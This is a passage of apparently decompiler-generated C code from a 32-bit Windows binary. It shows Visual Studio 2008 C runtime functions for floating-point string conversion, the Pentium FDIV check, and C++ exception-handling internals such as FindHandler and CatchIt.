      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



// Library Function - Single Match
//  __cftof_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftof_l(double *param_1,undefined *param_2,int param_3,size_t param_4,localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == -1) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (uint)(local_30.sign == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,local_30.decpt + param_4,
                      &local_30);
    if (eVar2 == 0) {
      __cftof2_l(param_2,param_3,param_4,'\0',param_5);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftog_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftog_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  char *pcVar1;
  int *piVar2;
  errno_t eVar3;
  size_t _SizeInBytes;
  char *pcVar4;
  _strflt local_34;
  int local_24;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_34,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_24 = local_34.decpt + -1;
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (local_34.sign == 0x2d);
    }
    eVar3 = __fptostr(param_2 + (local_34.sign == 0x2d),_SizeInBytes,param_4,&local_34);
    if (eVar3 == 0) {
      local_34.decpt = local_34.decpt + -1;
      if ((local_34.decpt < -4) || ((int)param_4 <= local_34.decpt)) {
        __cftoe2_l(param_3,param_4,param_5,&local_34.sign,'\x01',param_6);
      }
      else {
        pcVar1 = param_2 + (local_34.sign == 0x2d);
        if (local_24 < local_34.decpt) {
          do {
            pcVar4 = pcVar1;
            pcVar1 = pcVar4 + 1;
          } while (*pcVar4 != '\0');
          pcVar4[-1] = '\0';
        }
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
      }
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cfltcvt_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l(arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      eVar1 = __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
    else {
      eVar1 = __cftog_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



// Library Function - Single Match
//  __cfltcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __setdefaultprecision
// 
// Library: Visual Studio 2008 Release

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __ms_p5_test_fdiv
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __ms_p5_test_fdiv(void)

{
  double dVar1;
  
  dVar1 = _DAT_004286b8 - (_DAT_004286b8 / _DAT_004286c0) * _DAT_004286c0;
  if (1.0 < dVar1 != NAN(dVar1)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __ms_p5_mp_test_fdiv
// 
// Library: Visual Studio 2008 Release

void __ms_p5_mp_test_fdiv(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA(s_KERNEL32_004286e4);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_GAIsProcessorFeaturePresent_004286c6 + 2);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(0);
      return;
    }
  }
  __ms_p5_test_fdiv();
  return;
}



// Library Function - Single Match
//  public: __thiscall std::bad_exception::bad_exception(char const *)
// 
// Library: Visual Studio 2008 Release

bad_exception * __thiscall std::bad_exception::bad_exception(bad_exception *this,char *param_1)

{
  exception::exception((exception *)this,&param_1);
  *(undefined ***)this = &PTR_FUN_004286f8;
  return this;
}



undefined4 * __thiscall FUN_0041e547(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_004286f8;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00410837(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_0041e5c6:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_0041e5a5:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_0041e5c6;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_0041e5a5;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___FrameUnwindFilter
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl ___FrameUnwindFilter(int **param_1)

{
  _ptiddata p_Var1;
  
  if (**param_1 == -0x1fbcb0b3) {
    p_Var1 = __getptd();
    if (0 < p_Var1->_ProcessingThrow) {
      p_Var1 = __getptd();
      p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
    }
  }
  else if (**param_1 == -0x1f928c9d) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = 0;
    terminate();
    return p_Var1;
  }
  return (_ptiddata)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2008 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int *piVar3;
  int iVar4;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar4 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar4 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar4 != param_4) {
    if ((iVar4 < 0) || (*(int *)(param_3 + 4) <= iVar4)) {
      _inconsistency();
    }
    iVar2 = iVar4 * 8;
    piVar3 = (int *)(*(int *)(param_3 + 8) + iVar2);
    iVar4 = *piVar3;
    if (piVar3[1] != 0) {
      *(int *)(param_1 + 8) = iVar4;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar2),param_1,0x103);
    }
  }
  FUN_0041e6dc();
  if (iVar4 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar4;
  return;
}



void FUN_0041e6dc(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2008 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2008 Release

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void FUN_0041e835(void *param_1)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
  if (p_Var2->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  unexpected();
  terminate();
  p_Var2 = __getptd();
  p_Var2->_curexcspec = param_1;
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00428f78;
  uStack_c = 0x41e88a;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_0041e9a4();
  return local_20;
}



void FUN_0041e9a4(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2008 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          _memmove(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        _memmove(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_0041ea9f;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_0041ea9f:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2008 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(ulong)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  _ptiddata p_Var1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint extraout_var;
  uint uVar6;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var1 = __getptd();
    uVar6 = extraout_var;
    if (p_Var1->_translator != (void *)0x0) {
      p_Var1 = __getptd();
      pvVar2 = (void *)__encoded_null();
      if (((p_Var1->_translator != pvVar2) && (*(int *)param_1 != -0x1fbcb0b3)) &&
         (iVar3 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar3 != 0)) {
        return;
      }
    }
    if (*(int *)(param_5 + 0xc) == 0) {
      _inconsistency();
    }
    piVar4 = (int *)_GetRangeOfTrysToCheck
                              (param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff4);
    if (local_8 < uVar6) {
      do {
        if ((*piVar4 <= param_6) && (param_6 <= piVar4[1])) {
          iVar5 = piVar4[3] * 0x10 + piVar4[4];
          iVar3 = *(int *)(iVar5 + -0xc);
          if (((iVar3 == 0) || (*(char *)(iVar3 + 8) == '\0')) &&
             ((*(byte *)(iVar5 + -0x10) & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)uVar6);
          }
        }
        local_8 = local_8 + 1;
        piVar4 = piVar4 + 5;
      } while (local_8 < uVar6);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  _s_FuncInfo *p_Var1;
  uchar uVar2;
  bool bVar3;
  _ptiddata p_Var4;
  int iVar5;
  int *piVar6;
  EHRegistrationNode *unaff_EBX;
  _s_FuncInfo *p_Var7;
  _s_FuncInfo **pp_Var8;
  int unaff_ESI;
  _s_FuncInfo *p_Var9;
  _s_ESTypeList *unaff_EDI;
  EHRegistrationNode *pEVar10;
  bad_exception in_stack_ffffffd0;
  uint local_20;
  int local_1c;
  _s_FuncInfo *local_18;
  uint local_14;
  byte *local_10;
  int local_c;
  char local_5;
  
  local_5 = '\0';
  if (*(int *)(param_5 + 4) < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (*(int *)(param_5 + 4) <= local_c)) {
    _inconsistency();
  }
  p_Var9 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 != -0x1f928c9d) goto LAB_0041f090;
  p_Var7 = (_s_FuncInfo *)0x19930520;
  if (*(int *)(param_1 + 0x10) != 3) goto LAB_0041eefd;
  iVar5 = *(int *)(param_1 + 0x14);
  if (((iVar5 != 0x19930520) && (iVar5 != 0x19930521)) && (iVar5 != 0x19930522)) goto LAB_0041eefd;
  if (*(int *)(param_1 + 0x1c) != 0) goto LAB_0041eefd;
  p_Var4 = __getptd();
  if (p_Var4->_curexception != (void *)0x0) {
    p_Var4 = __getptd();
    param_1 = (EHExceptionRecord *)p_Var4->_curexception;
    p_Var4 = __getptd();
    param_3 = (_CONTEXT *)p_Var4->_curcontext;
    iVar5 = _ValidateRead(param_1,1);
    if (iVar5 == 0) {
      _inconsistency();
    }
    if ((((*(int *)param_1 == -0x1f928c9d) && (*(int *)((int)param_1 + 0x10) == 3)) &&
        ((iVar5 = *(int *)((int)param_1 + 0x14), iVar5 == 0x19930520 ||
         ((iVar5 == 0x19930521 || (iVar5 == 0x19930522)))))) && (*(int *)((int)param_1 + 0x1c) == 0)
       ) {
      _inconsistency();
    }
    p_Var4 = __getptd();
    if (p_Var4->_curexcspec == (void *)0x0) goto LAB_0041eefd;
    p_Var4 = __getptd();
    piVar6 = (int *)p_Var4->_curexcspec;
    p_Var4 = __getptd();
    iVar5 = 0;
    p_Var4->_curexcspec = (void *)0x0;
    uVar2 = IsInExceptionSpec(param_1,unaff_EDI);
    if (uVar2 != '\0') goto LAB_0041eefd;
    p_Var7 = (_s_FuncInfo *)0x0;
    if (0 < *piVar6) {
      do {
        bVar3 = type_info::operator==
                          (*(type_info **)(p_Var7 + piVar6[1] + 4),
                           (type_info *)&PTR_PTR__scalar_deleting_destructor__0042b674);
        if (bVar3) goto LAB_0041eece;
        iVar5 = iVar5 + 1;
        p_Var7 = p_Var7 + 0x10;
      } while (iVar5 < *piVar6);
    }
    do {
      terminate();
LAB_0041eece:
      ___DestructExceptionObject((int *)param_1);
      std::bad_exception::bad_exception((bad_exception *)&stack0xffffffd0,s_bad_exception_00428700);
      __CxxThrowException_8(&stack0xffffffd0,&DAT_00428fdc);
LAB_0041eefd:
      p_Var9 = (_s_FuncInfo *)param_1;
      if (((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x10) == 3)) &&
         ((p_Var1 = *(_s_FuncInfo **)(param_1 + 0x14), p_Var1 == p_Var7 ||
          ((p_Var1 == (_s_FuncInfo *)0x19930521 || (p_Var1 == (_s_FuncInfo *)0x19930522)))))) {
        if (*(int *)(param_5 + 0xc) != 0) {
          piVar6 = (int *)_GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_20);
          for (; local_14 < local_20; local_14 = local_14 + 1) {
            if ((*piVar6 <= local_c) && (local_c <= piVar6[1])) {
              local_10 = (byte *)piVar6[4];
              for (local_1c = piVar6[3]; 0 < local_1c; local_1c = local_1c + -1) {
                pp_Var8 = *(_s_FuncInfo ***)(*(int *)(param_1 + 0x1c) + 0xc);
                for (local_18 = *pp_Var8; 0 < (int)local_18; local_18 = local_18 + -1) {
                  pp_Var8 = pp_Var8 + 1;
                  p_Var9 = *pp_Var8;
                  iVar5 = ___TypeMatch(local_10,(byte *)p_Var9,*(uint **)(param_1 + 0x1c));
                  if (iVar5 != 0) {
                    local_5 = '\x01';
                    CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,p_Var9
                            ,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                            (_s_TryBlockMapEntry *)unaff_EDI,unaff_ESI,unaff_EBX,
                            (uchar)in_stack_ffffffd0);
                    goto LAB_0041efe6;
                  }
                }
                local_10 = local_10 + 0x10;
              }
            }
LAB_0041efe6:
            piVar6 = piVar6 + 5;
          }
        }
        if (param_6 != '\0') {
          ___DestructExceptionObject((int *)param_1);
        }
        if ((((local_5 != '\0') || ((*(uint *)param_5 & 0x1fffffff) < 0x19930521)) ||
            (*(int *)(param_5 + 0x1c) == 0)) ||
           (uVar2 = IsInExceptionSpec(param_1,unaff_EDI), uVar2 != '\0')) goto LAB_0041f0bc;
        __getptd();
        __getptd();
        p_Var4 = __getptd();
        p_Var4->_curexception = param_1;
        p_Var4 = __getptd();
        p_Var4->_curcontext = param_3;
        pEVar10 = param_8;
        if (param_8 == (EHRegistrationNode *)0x0) {
          pEVar10 = param_2;
        }
        _UnwindNestedFrames(pEVar10,param_1);
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
        FUN_0041e835(*(void **)(param_5 + 0x1c));
        p_Var9 = param_5;
      }
LAB_0041f090:
      if (*(int *)(param_5 + 0xc) == 0) goto LAB_0041f0bc;
      p_Var7 = param_5;
    } while (param_6 != '\0');
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var9,param_2,param_3,param_4,param_5,local_c,param_7,param_8);
LAB_0041f0bc:
    p_Var4 = __getptd();
    if (p_Var4->_curexcspec != (void *)0x0) {
      _inconsistency();
    }
  }
  return;
}



undefined4 * __thiscall FUN_0041f0d4(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = &PTR_FUN_004286f8;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,uint *param_5,
          int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((*param_5 & 0x1fffffff) < 0x19930522 || ((*(byte *)(param_5 + 8) & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5[3] != 0) || ((0x19930520 < (*param_5 & 0x1fffffff) && (param_5[7] != 0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,(_s_FuncInfo *)param_5,
                    param_8,param_6,param_7);
      }
    }
    else if ((param_5[1] != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
